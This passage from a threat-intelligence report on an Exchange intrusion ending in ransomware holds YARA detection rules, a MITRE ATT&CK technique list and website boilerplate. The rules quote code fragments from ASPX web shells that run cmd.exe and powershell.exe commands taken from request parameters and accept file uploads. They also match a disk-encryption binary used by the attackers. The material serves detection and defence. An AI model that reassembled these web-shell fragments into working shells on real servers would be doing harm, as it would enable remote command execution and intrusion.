WEBSHELL_ASPX_ProxyShell_Aug21_2
SUSP_ASPX_PossibleDropperArtifact_Aug21
SUSP_ASPX_PossibleDropperArtifact_Aug21</pre>
<pre><code><span class="hljs-comment">/*
   YARA Rule Set
   Author: The DFIR Report
   Date: 2021-11-14
   Identifier: 6898
   Reference: https://thedfirreport.com
*/</span>

<span class="hljs-comment">/* Rule Set ----------------------------------------------------------------- */</span>

import <span class="hljs-string">"pe"</span>

rule sig_6898_login_webshell {
   meta:
      description = <span class="hljs-string">"6898 - file login.aspx"</span>
      author = <span class="hljs-string">"The DFIR Report"</span>
      reference = <span class="hljs-string">"https://thedfirreport.com"</span>
      date = <span class="hljs-string">"2021-11-14"</span>
      hash1 = <span class="hljs-string">"98ccde0e1a5e6c7071623b8b294df53d8e750ff2fa22070b19a88faeaa3d32b0"</span>
   strings:
      <span class="hljs-variable">$s1</span> = <span class="hljs-string">"&lt;asp:TextBox id='xpath' runat='server' Width='300px'&gt;c:\\windows\\system32\\cmd.exe&lt;/asp:TextBox&gt;        "</span> fullword ascii
      <span class="hljs-variable">$s2</span> = <span class="hljs-string">"myProcessStartInfo.UseShellExecute = false            "</span> fullword ascii
      <span class="hljs-variable">$s3</span> = <span class="hljs-string">"\"Microsoft.Exchange.ServiceHost.exe0r"</span> fullword ascii
      <span class="hljs-variable">$s4</span> = <span class="hljs-string">"myProcessStartInfo.Arguments=xcmd.text            "</span> fullword ascii
      <span class="hljs-variable">$s5</span> = <span class="hljs-string">"myProcess.StartInfo = myProcessStartInfo            "</span> fullword ascii
      <span class="hljs-variable">$s6</span> = <span class="hljs-string">"myProcess.Start()            "</span> fullword ascii
      <span class="hljs-variable">$s7</span> = <span class="hljs-string">"myProcessStartInfo.RedirectStandardOutput = true            "</span> fullword ascii
      <span class="hljs-variable">$s8</span> = <span class="hljs-string">"myProcess.Close()                       "</span> fullword ascii
      <span class="hljs-variable">$s9</span> = <span class="hljs-string">"Dim myStreamReader As StreamReader = myProcess.StandardOutput            "</span> fullword ascii
      <span class="hljs-variable">$s10</span> = <span class="hljs-string">"&lt;%@ import Namespace='system.IO' %&gt;"</span> fullword ascii
      <span class="hljs-variable">$s11</span> = <span class="hljs-string">"&lt;%@ import Namespace='System.Diagnostics' %&gt;"</span> fullword ascii
      <span class="hljs-variable">$s12</span> = <span class="hljs-string">"Dim myProcess As New Process()            "</span> fullword ascii
      <span class="hljs-variable">$s13</span> = <span class="hljs-string">"Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            "</span> fullword ascii
      <span class="hljs-variable">$s14</span> = <span class="hljs-string">"example.org0"</span> fullword ascii
      <span class="hljs-variable">$s16</span> = <span class="hljs-string">"&lt;script runat='server'&gt;      "</span> fullword ascii
      <span class="hljs-variable">$s17</span> = <span class="hljs-string">"&lt;asp:TextBox id='xcmd' runat='server' Width='300px' Text='/c whoami'&gt;/c whoami&lt;/asp:TextBox&gt;        "</span> fullword ascii
      <span class="hljs-variable">$s18</span> = <span class="hljs-string">"&lt;p&gt;&lt;asp:Button id='Button' onclick='runcmd' runat='server' Width='100px' Text='Run'&gt;&lt;/asp:Button&gt;        "</span> fullword ascii
      <span class="hljs-variable">$s19</span> = <span class="hljs-string">"Sub RunCmd()            "</span> fullword ascii
   condition:
      uint16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x8230</span> <span class="hljs-keyword">and</span> filesize &lt; <span class="hljs-number">6</span>KB <span class="hljs-keyword">and</span>
      <span class="hljs-number">8</span> of them
}

rule aspx_gtonvbgidhh_webshell {
   meta:
      description = <span class="hljs-string">"6898 - file aspx_gtonvbgidhh.aspx"</span>
      author = <span class="hljs-string">"The DFIR Report"</span>
      reference = <span class="hljs-string">"https://thedfirreport.com"</span>
      date = <span class="hljs-string">"2021-11-14"</span>
      hash1 = <span class="hljs-string">"dc4186dd9b3a4af8565f87a9a799644fce8af25e3ee8777d90ae660d48497a04"</span>
   strings:
      <span class="hljs-variable">$s1</span> = <span class="hljs-string">"info.UseShellExecute = false;"</span> fullword ascii
      <span class="hljs-variable">$s2</span> = <span class="hljs-string">"info.Arguments = \"/c \" + command;"</span> fullword ascii
      <span class="hljs-variable">$s3</span> = <span class="hljs-string">"var dstFile = Path.Combine(dstDir, Path.GetFileName(httpPostedFile.FileName));"</span> fullword ascii
      <span class="hljs-variable">$s4</span> = <span class="hljs-string">"info.FileName = \"powershell.exe\";"</span> fullword ascii
      <span class="hljs-variable">$s5</span> = <span class="hljs-string">"using (StreamReader streamReader = process.StandardError)"</span> fullword ascii
      <span class="hljs-variable">$s6</span> = <span class="hljs-string">"return httpPostedFile.FileName + \" Uploaded to: \" + dstFile;"</span> fullword ascii
      <span class="hljs-variable">$s7</span> = <span class="hljs-string">"httpPostedFile.InputStream.Read(buffer, 0, fileLength);"</span> fullword ascii
      <span class="hljs-variable">$s8</span> = <span class="hljs-string">"int fileLength = httpPostedFile.ContentLength;"</span> fullword ascii
      <span class="hljs-variable">$s9</span> = <span class="hljs-string">"result = result +  Environment.NewLine + \"ERROR:\" + Environment.NewLine + error;"</span> fullword ascii
      <span class="hljs-variable">$s10</span> = <span class="hljs-string">"ALAAAAAAAAAAA"</span> fullword ascii <span class="hljs-comment">/* base64 encoded string ',' */</span>
      <span class="hljs-variable">$s11</span> = <span class="hljs-string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span> ascii <span class="hljs-comment">/* base64 encoded string '' */</span>
      <span class="hljs-variable">$s12</span> = <span class="hljs-string">"var result = delimiter +  this.RunIt(Request.Params[\"exec_code\"]) + delimiter;"</span> fullword ascii
      <span class="hljs-variable">$s13</span> = <span class="hljs-string">"AAAAAAAAAAAAAAAAAAAAAAAA6AAAAAAAAAAAAAAA"</span> ascii <span class="hljs-comment">/* base64 encoded string ':' */</span>
      <span class="hljs-variable">$s14</span> = <span class="hljs-string">"using (StreamReader streamReader = process.StandardOutput)"</span> fullword ascii
      <span class="hljs-variable">$s15</span> = <span class="hljs-string">"private string RunIt(string command)"</span> fullword ascii
      <span class="hljs-variable">$s16</span> = <span class="hljs-string">"Process process = Process.Start(info);"</span> fullword ascii
      <span class="hljs-variable">$s17</span> = <span class="hljs-string">"ProcessStartInfo info = new ProcessStartInfo();"</span> fullword ascii
      <span class="hljs-variable">$s18</span> = <span class="hljs-string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6"</span> ascii <span class="hljs-comment">/* base64 encoded string ':' */</span>
      <span class="hljs-variable">$s19</span> = <span class="hljs-string">"6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span> ascii <span class="hljs-comment">/* base64 encoded string '' */</span>
      <span class="hljs-variable">$s20</span> = <span class="hljs-string">"if (Request.Params[\"exec_code\"] == \"put\")"</span> fullword ascii
   condition:
      uint16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x4221</span> <span class="hljs-keyword">and</span> filesize &lt; <span class="hljs-number">800</span>KB <span class="hljs-keyword">and</span>
      <span class="hljs-number">8</span> of them
}

rule aspx_qdajscizfzx_webshell {
   meta:
      description = <span class="hljs-string">"6898 - file aspx_qdajscizfzx.aspx"</span>
      author = <span class="hljs-string">"The DFIR Report"</span>
      reference = <span class="hljs-string">"https://thedfirreport.com"</span>
      date = <span class="hljs-string">"2021-11-14"</span>
      hash1 = <span class="hljs-string">"60d22223625c86d7f3deb20f41aec40bc8e1df3ab02cf379d95554df05edf55c"</span>
   strings:
      <span class="hljs-variable">$s1</span> = <span class="hljs-string">"info.FileName = \"cmd.exe\";"</span> fullword ascii
      <span class="hljs-variable">$s2</span> = <span class="hljs-string">"info.UseShellExecute = false;"</span> fullword ascii
      <span class="hljs-variable">$s3</span> = <span class="hljs-string">"info.Arguments = \"/c \" + command;"</span> fullword ascii
      <span class="hljs-variable">$s4</span> = <span class="hljs-string">"var dstFile = Path.Combine(dstDir, Path.GetFileName(httpPostedFile.FileName));"</span> fullword ascii
      <span class="hljs-variable">$s5</span> = <span class="hljs-string">"using (StreamReader streamReader = process.StandardError)"</span> fullword ascii
      <span class="hljs-variable">$s6</span> = <span class="hljs-string">"return httpPostedFile.FileName + \" Uploaded to: \" + dstFile;"</span> fullword ascii
      <span class="hljs-variable">$s7</span> = <span class="hljs-string">"httpPostedFile.InputStream.Read(buffer, 0, fileLength);"</span> fullword ascii
      <span class="hljs-variable">$s8</span> = <span class="hljs-string">"int fileLength = httpPostedFile.ContentLength;"</span> fullword ascii
      <span class="hljs-variable">$s9</span> = <span class="hljs-string">"result = result +  Environment.NewLine + \"ERROR:\" + Environment.NewLine + error;"</span> fullword ascii
      <span class="hljs-variable">$s10</span> = <span class="hljs-string">"ALAAAAAAAAAAA"</span> fullword ascii <span class="hljs-comment">/* base64 encoded string ',' */</span>
      <span class="hljs-variable">$s11</span> = <span class="hljs-string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span> ascii <span class="hljs-comment">/* base64 encoded string '' */</span>
      <span class="hljs-variable">$s12</span> = <span class="hljs-string">"var result = delimiter +  this.RunIt(Request.Params[\"exec_code\"]) + delimiter;"</span> fullword ascii
      <span class="hljs-variable">$s13</span> = <span class="hljs-string">"AAAAAAAAAAAAAAAAAAAAAAAA6AAAAAAAAAAAAAAA"</span> ascii <span class="hljs-comment">/* base64 encoded string ':' */</span>
      <span class="hljs-variable">$s14</span> = <span class="hljs-string">"using (StreamReader streamReader = process.StandardOutput)"</span> fullword ascii
      <span class="hljs-variable">$s15</span> = <span class="hljs-string">"private string RunIt(string command)"</span> fullword ascii
      <span class="hljs-variable">$s16</span> = <span class="hljs-string">"Process process = Process.Start(info);"</span> fullword ascii
      <span class="hljs-variable">$s17</span> = <span class="hljs-string">"ProcessStartInfo info = new ProcessStartInfo();"</span> fullword ascii
      <span class="hljs-variable">$s18</span> = <span class="hljs-string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6"</span> ascii <span class="hljs-comment">/* base64 encoded string ':' */</span>
      <span class="hljs-variable">$s19</span> = <span class="hljs-string">"6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span> ascii <span class="hljs-comment">/* base64 encoded string '' */</span>
      <span class="hljs-variable">$s20</span> = <span class="hljs-string">"if (Request.Params[\"exec_code\"] == \"put\")"</span> fullword ascii
   condition:
      uint16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x4221</span> <span class="hljs-keyword">and</span> filesize &lt; <span class="hljs-number">800</span>KB <span class="hljs-keyword">and</span>
      <span class="hljs-number">8</span> of them
}

rule sig_6898_dcrypt {
   meta:
      description = <span class="hljs-string">"6898 - file dcrypt.exe"</span>
      author = <span class="hljs-string">"The DFIR Report"</span>
      reference = <span class="hljs-string">"https://thedfirreport.com"</span>
      date = <span class="hljs-string">"2021-11-14"</span>
      hash1 = <span class="hljs-string">"02ac3a4f1cfb2723c20f3c7678b62c340c7974b95f8d9320941641d5c6fd2fee"</span>
   strings:
      <span class="hljs-variable">$s1</span> = <span class="hljs-string">"For more detailed information, please visit http://www.jrsoftware.org/ishelp/index.php?topic=setupcmdline"</span> fullword wide
      <span class="hljs-variable">$s2</span> = <span class="hljs-string">"Causes Setup to create a log file in the user's TEMP directory."</span> fullword wide
      <span class="hljs-variable">$s3</span> = <span class="hljs-string">"Prevents the user from cancelling during the installation process."</span> fullword wide
      <span class="hljs-variable">$s4</span> = <span class="hljs-string">"/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L"</span> fullword ascii
      <span class="hljs-variable">$s5</span> = <span class="hljs-string">"Same as /LOG, except it allows you to specify a fixed path/filename to use for the log file."</span> fullword wide
      <span class="hljs-variable">$s6</span> = <span class="hljs-string">"/PASSWORD=password"</span> fullword wide
      <span class="hljs-variable">$s7</span> = <span class="hljs-string">"The Setup program accepts optional command line parameters."</span> fullword wide
      <span class="hljs-variable">$s8</span> = <span class="hljs-string">"Overrides the default component settings."</span> fullword wide
      <span class="hljs-variable">$s9</span> = <span class="hljs-string">"Specifies the password to use."</span> fullword wide
      <span class="hljs-variable">$s10</span> = <span class="hljs-string">"/MERGETASKS=\"comma separated list of task names\""</span> fullword wide
      <span class="hljs-variable">$s11</span> = <span class="hljs-string">"Instructs Setup to load the settings from the specified file after having checked the command line."</span> fullword wide
      <span class="hljs-variable">$s12</span> = <span class="hljs-string">"/DIR=\"x:\\dirname\""</span> fullword wide
      <span class="hljs-variable">$s13</span> = <span class="hljs-string">"http://diskcryptor.org/                                     "</span> fullword wide
      <span class="hljs-variable">$s14</span> = <span class="hljs-string">"Prevents Setup from restarting the system following a successful installation, or after a Preparing to Install failure that requ"</span> wide
      <span class="hljs-variable">$s15</span> = <span class="hljs-string">"HBPLg.sse"</span> fullword ascii
      <span class="hljs-variable">$s16</span> = <span class="hljs-string">"/LOG=\"filename\""</span> fullword wide
      <span class="hljs-variable">$s17</span> = <span class="hljs-string">"Overrides the default folder name."</span> fullword wide
      <span class="hljs-variable">$s18</span> = <span class="hljs-string">"Overrides the default setup type."</span> fullword wide
      <span class="hljs-variable">$s19</span> = <span class="hljs-string">"Overrides the default directory name."</span> fullword wide
      <span class="hljs-variable">$s20</span> = <span class="hljs-string">"* AVz'"</span> fullword ascii
   condition:
      uint16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x5a4d</span> <span class="hljs-keyword">and</span> filesize &lt; <span class="hljs-number">5000</span>KB <span class="hljs-keyword">and</span>
      ( pe.imphash() == <span class="hljs-string">"48aa5c8931746a9655524f67b25a47ef"</span> <span class="hljs-keyword">or</span> <span class="hljs-number">8</span> of them )
}
</code></pre>
<h2 id="mitre">MITRE</h2>
<ul>
<li>Exploit Public-Facing Application &#8211; T1190</li>
<li>OS Credential Dumping &#8211; T1003</li>
<li>Network Service Scanning &#8211; T1046</li>
<li>Remote Desktop Protocol &#8211; T1021.001</li>
<li>Account Manipulation &#8211; T1098</li>
<li>Valid Accounts &#8211; T1078</li>
<li>Protocol Tunneling &#8211; T1572</li>
<li>Ingress Tool Transfer &#8211; T1105</li>
<li>Match Legitimate Name or Location &#8211; T1036.005</li>
<li>Windows Service &#8211; T1543.003</li>
<li>Data Encrypted for Impact &#8211; T1486</li>
<li>Web Shell &#8211; T1505.003</li>
<li>System Information Discovery &#8211; T1082</li>
<li>System Network Configuration Discovery &#8211; T1016</li>
<li>System Owner/User Discovery &#8211; T1033</li>
<li>Windows Command Shell &#8211; T1059.003</li>
</ul>
<h3 id="internal-case-6898">Internal case #6898</h3>
</div>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-4551" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-4551" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/?share=reddit" target="_blank" title="Click to share on Reddit" ><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-4551" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
	</div><!-- .entry-content -->

	
		<footer class="entry-footer">
			<div class="entry-meta">

							</div><!-- .entry-meta -->
		</footer><!-- .entry-footer -->
			
		</div><!-- .entry-content-holder -->
</article><!-- #post-4551 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/" rel="prev">From Zero to Domain Admin</a></div><div class="nav-next"><a href="https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/" rel="next">CONTInuing the Bazar Ransomware Story</a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->


<aside id="secondary" class="widget-area">
	<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block">	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="175340963"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									class="no-border-radius "
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="175340963"/>
							<input type="hidden" name="source" value="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value=""/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="8efaaaa22f" /><input type="hidden" name="_wp_http_referer" value="/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/" /><input type="hidden" name="post_id" value="4551"/>							<button type="submit"
																	class="wp-block-button__link no-border-radius"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt="" class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt="" class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt="" class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt="" class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt="" class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt="" class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside><!-- #secondary -->
</div><!-- .wrap .wrap-width-->
		</div><!-- .site-content-cell -->
	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">

			
		<div class="copyright-area">
			<div class="wrap">
								<div class="site-info">
					    <a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved				</div><!-- .site-info -->
												<div class="footer-right-info">
															</div>
									</div><!-- .wrap -->
		</div><!-- .copyright-area -->
	</footer><!-- #colophon -->
			<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
	</div><!-- #page -->


	<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="d4f6f922a1a6506cd6aa1d03-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2021\/11\/15\/exchange-exploit-leads-to-domain-wide-ransomware\/":4551};
	</script>
				<style id='jetpack-block-subscriptions-inline-css' type='text/css'>
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form 